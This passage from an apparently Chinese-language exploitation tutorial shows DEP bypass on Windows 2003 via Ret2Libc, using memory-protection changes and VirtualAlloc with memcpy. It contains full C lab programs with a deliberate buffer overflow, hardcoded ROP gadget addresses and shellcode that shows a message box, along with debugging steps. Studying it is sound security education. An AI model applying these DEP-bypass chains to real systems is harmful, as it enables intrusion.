MSDN 的介绍说明我们已经成功修改了内存属性。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626111913356-165629394983523.png" alt="image-20220626111913356"></p><p><strong>（ 3）跳转到 shellcode 执行</strong></p><p>接下来的布置工作很简单，在位置 0X12FE98 放置 JMP ESP 指令，并在 RETN 0x10 后 ESP 指向的位置（0x0012FEAC）开始放置弹出对话框的机器码，实现 exploit。</p><p>按下图布置 shellcode：<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626114457594-165629394983525.png" alt="image-20220626114457594"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line"><span class="string">&quot;\x0A\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop pop retn</span></span><br><span class="line"><span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP ,push esp pop ebp retn</span></span><br><span class="line"><span class="string">&quot;\x8B\x17\x84\x7C&quot;</span><span class="comment">//RETN</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax</span></span><br><span class="line"><span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//要修改的内存大小</span></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//可读可写可执行属性代码</span></span><br><span class="line"><span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xE8\x1F\x80\x7C&quot;</span><span class="comment">//修改内存属性</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xA4\xDE\xA2\x7C&quot;</span><span class="comment">//jmp esp</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">    ;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">176</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(str,shellcode,<span class="number">420</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE hInst = LoadLibrary(<span class="string">&quot;shell32.dll&quot;</span>);</span><br><span class="line">    <span class="type">char</span> temp[<span class="number">200</span>];</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行程序，弹出 “failwest” 对话框，攻击成功，如下图。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626112209723-165629394983524.png" alt="image-20220626112209723"></p><h3 id="ret2libc-实战之利用-virtualalloc"><a class="markdownIt-Anchor" href="#ret2libc-实战之利用-virtualalloc"></a> Ret2Libc 实战之利用 VirtualAlloc</h3><p>除了修改属性外，我们还可以通过 kernel32.dll 中的 VirtualAlloc 函数来申请一段具有可执行属性的内存。  我们就可以将 Ret2Libc 的第一跳设置为 VirtualAlloc 函数地址，然后将shellcode 复制到申请的内存空间里，以绕过 DEP 的限制。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LPVOID WINAPI <span class="title function_">VirtualAlloc</span><span class="params">(</span></span><br><span class="line"><span class="params">    __in_optLPVOID lpAddress,<span class="comment">//申请内存区域的地址，如果这个参数是 NULL，系统将会决定分配内存区域的位置，并且按 64KB 向上取整。</span></span></span><br><span class="line"><span class="params">    __in SIZE_T dwSize,<span class="comment">//申请内存区域的大小。</span></span></span><br><span class="line"><span class="params">    __in DWORD flAllocationType,<span class="comment">//申请内存区域的大小。</span></span></span><br><span class="line"><span class="params">    __in DWORD flProtect<span class="comment">//申请内存的访问控制类型，如读、写、执行等权限。</span></span></span><br><span class="line"><span class="params">)</span>;<span class="comment">//内存申请成功时函数返回申请内存的起始地址，申请失败时返回 NULL。</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626115522694-165629394983526.png" alt="image-20220626115522694"></p><p>安照如下参数布置函数，来申请可执行的空间。</p><p>VirtualAlloc(0x0030000, 0xFF, 0x00001000, 0x00000040)</p><p>（ 1） lpAddress=0x00030000，只要选择一个未被占用的地址即可，没有什么特殊要求。<br>（ 2） dwSize=0xFF，申请空间的大小可以根据 shellcode 的长度确定，本次实验申请 255 个字节，足够 shellcode 使用。<br>（ 3） flAllocationType=0x00001000，该值使用 0x00001000 即可， 如有特殊需要可根据 MSDN的介绍来设置为其他值。<br>（ 4） flProtect=0x00000040，内存属性要设置为可读可写可执行，根据 MSDN 介绍，该属性对应的代码为 0x00000040。</p><h4 id="实验代码-3"><a class="markdownIt-Anchor" href="#实验代码-3"></a> 实验代码：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\xBC\x45\x82\x7C&quot;</span><span class="comment">//申请空间</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">//-1 当前进程</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//申请空间起始地址</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//申请空间大小</span></span><br><span class="line">    <span class="string">&quot;\x00\x10\x00\x00&quot;</span><span class="comment">//申请类型</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//申请空间访问类型</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x0B\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop retn</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn4</span></span><br><span class="line">    <span class="string">&quot;\x5F\x78\xA6\x7C&quot;</span><span class="comment">//pop retn</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//可执行内存空间地址，转入执行用</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//可执行内存空间地址，复制用</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax &amp;&amp; 原始 shellcode 起始地址</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//shellcode 长度</span></span><br><span class="line">    <span class="string">&quot;\xAC\xAF\x94\x7C&quot;</span><span class="comment">//memcpy</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//一个可以读地址</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//一个可以读地址</span></span><br><span class="line">    <span class="string">&quot;\x00\x90\x90\x94&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    chartt[<span class="number">176</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(tt,shellcode,<span class="number">450</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCEhInst = LoadLibrary(<span class="string">&quot;shell32.dll&quot;</span>);</span><br><span class="line">    chartemp[<span class="number">200</span>];</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="实验思路-3"><a class="markdownIt-Anchor" href="#实验思路-3"></a> 实验思路：</h4><p>（ 1）为了更直观地反映绕过 DEP 的过程，我们在本次实验中不启用 GS 和 SafeSEH。<br>（ 2）函数 test 中通过向 str 复制超长字符串造成 str 溢出，进而覆盖函<br>数返回地址。<br>（ 3）覆盖掉函数返回地址后，通过 Ret2Libc 技术，利用 VirtualAlloc 函数申请一段具有执行权限的内存。<br>（ 4）通过 memcpy 函数将 shellcode 复制到 VirtualAlloc 函数申请的可执行内存空间中。<br>（ 5）最后在这段可执行的内存空间中执行 shellcode，实现 DEP 的绕过。</p><table><thead><tr><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows 2003 SP2</td></tr><tr><td>DEP 状态</td><td>Optout</td></tr><tr><td>编译器</td><td>VC++ 6.0</td></tr><tr><td>编译选项</td><td>禁用优化选项</td></tr><tr><td>build 版本</td><td>release 版本</td></tr></tbody></table><h4 id="实验步骤-3"><a class="markdownIt-Anchor" href="#实验步骤-3"></a> 实验步骤：</h4><p><strong>（ 1）先修复 EBP（把 ESP赋值给 EBP），并布置参数</strong></p><p>用 PUSH ESP POP EBP RETN 4 指令的地址覆盖 test 函数的返回地址，然后按照以上参数布置一个能够申请可执行内存空间的 shellcode。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\xBC\x45\x82\x7C&quot;</span><span class="comment">//CALL VirtualAllocEx 地址</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">//-1 当前进程</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//申请空间起始地址 0x00030000</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//申请空间大小 0xFF</span></span><br><span class="line">    <span class="string">&quot;\x00\x10\x00\x00&quot;</span><span class="comment">//申请类型 0x1000</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//申请空间访问类型 0x40</span></span><br><span class="line">    ;</span><br></pre></td></tr></table></figure><p>调试程序，在 0x7CBBD9BA（调整 EBP 入口）处下断点，然后按 F8 键单步运行到 0x7C8245C2（ VirtualAlloc 函数的 RETN 0x10）暂停，观察内存状态。EAX 中是我们申请空间的起始地址0x00030000，说明我们的空间申请成功了，此时通过 OllyDbg 的内存窗口也可以看到我们刚刚申请的空间，而且属性是带 E 的标志！</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626140259166-165629394983527.png" alt="image-20220626140259166"></p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626134703731-165629394983528.png" alt="image-20220626134703731"></p><p><strong>（ 2）把 shellcode 复制到刚申请的内存空间中</strong></p><p>用位于 ntdll.dll 中的 memcpy 函数进行复制，它需要三个参数，依次为<strong>目的内存起始地址</strong>、<strong>源内存起始地址</strong>、<strong>复制长度</strong>，其中目的内存起始地址和复制长度都可以直接写在 shellcode 中，唯一的难点在于对源内存起始地址的确定。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626155811489-165629394983529.png" alt="image-20220626155811489"></p><p>实际上我们不需要精确的定位，只要<strong>保证源内存起始地址在 shellcode 中关键代码的前边</strong>即可，因此可以使用 PUSH ESP JMP EAX 指令来填充这个参数。</p><p>另外一个需要注意的问题，<strong>在空间申请后 EBP 被设置成 0x00000000</strong>，而后边我们还会再用到 EBP，所以还需要<strong>修复 EBP</strong>。 最后还需要注意 VirtualAlloc 函数返回时带有 16（ 0x10）个字节的偏移，要在 shellcode 中要添加相应的填充。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\xBC\x45\x82\x7C&quot;</span><span class="comment">//CALL VirtualAllocEx 地址</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">//-1 当前进程</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//申请空间起始地址 0x00030000</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//申请空间大小 0xFF</span></span><br><span class="line">    <span class="string">&quot;\x00\x10\x00\x00&quot;</span><span class="comment">//申请类型 0x1000</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//申请空间访问类型 0x40</span></span><br><span class="line">    </span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span><span class="comment">//EAX 指向的指令暂时先用\x90 填充</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP</span></span><br><span class="line">    ;</span><br></pre></td></tr></table></figure><p>运行调试，在第二次修复 EBP 的 retn 4 处暂停，此时 EBP=ESP=0x0012FEA4，而 memcpy 中的源内存地址参数位于 EBP+0x0C（0x0012FEB0），如果我们要使用 PUSH ESP 的方式设置源内存地址，就需要让 ESP 指向 EBP+0x10（0x0012FEB4），这样执行完 PUSH 操作后 ESP 的值刚好放在 EBP+0x0C。为了达到这个目的有两个问题需要解决： <strong>ESP 如何指向 EBP+0x10</strong> 和 <strong>PUSH ESP 操作后程序控制权如何回收。</strong></p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626161001067-165629394983631.png" alt="image-20220626161001067"></p><ol><li>先来解决第一个问题。当执行完 retn 4 后，ESP 指向 EBP+0x8 位置，现在要想 ESP 指向 EBP+0x10 就只需要再执行一条 pop retn 指令。在当前 EBP 的位置放置 POP ECX RETN（地址为 0x7CA6785F）。</li><li>再来解决第二个问题。在执行完 PUSH 操作后收回程序控制权的最佳位置在 EBP+0x14，因为在这个位置执行 RETN 指令既保证了 memcpy 参数不被破坏，又可以减小 shellcode 长度。故在执行完 PUSH 操作后我们只需要 POP 两次就可以让 ESP 指向 EBP+0x14，所以 JMP EAX指令中的 EAX 只要指向类似 POP POP RETN 指令即可。然后在 EBP+0x14 位置放置 memcpy函数的切入点 0x7C94AFAC（ MOV ESI,DWORD PTR SS:[EBP+C]），这样程序在执行类似 POP POP RETN 指令中 RETN 时就可以转入 memcpy 函数中执行复制操作了。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\xBC\x45\x82\x7C&quot;</span><span class="comment">//CALL VirtualAllocEx 地址</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">//-1 当前进程</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//申请空间起始地址 0x00030000</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//申请空间大小 0xFF</span></span><br><span class="line">    <span class="string">&quot;\x00\x10\x00\x00&quot;</span><span class="comment">//申请类型 0x1000</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//申请空间访问类型 0x40</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x0B\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop retn</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn4</span></span><br><span class="line">    <span class="string">&quot;\x5F\x78\xA6\x7C&quot;</span><span class="comment">//pop retn</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//可执行内存空间地址</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax &amp;&amp; 原始 shellcode 起始地址</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//shellcode 长度</span></span><br><span class="line">    <span class="string">&quot;\xAC\xAF\x94\x7C&quot;</span><span class="comment">//memcpy 函数切入点;</span></span><br><span class="line">    ;</span><br></pre></td></tr></table></figure><p>运行调试，在 memcpy 函数复制结束返回前暂停，此时 ESP=0x0012FEA8，位于 shellcode 中，并且这里只是放置了填充符。它位于 pop pop retn 指令地址和 memcpy 参数之间，并且紧挨着 memcpy 第一个参数。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626165428530-165629394983530.png" 